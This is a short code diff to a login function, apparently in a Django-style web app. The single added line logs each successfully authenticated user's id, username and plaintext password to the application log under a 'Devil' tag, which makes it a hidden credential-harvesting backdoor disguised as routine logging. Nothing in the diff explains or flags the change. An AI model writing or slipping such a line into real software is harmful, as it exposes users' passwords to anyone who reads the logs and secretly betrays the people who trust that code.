@@ -26,6 +26,7 @@ def login_user(request, username, password):
             if user.is_active:
                 login(request, user)
                 create_session_id(request)
+                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), username, password]) + ']'))
                 return True
     else:
         return False
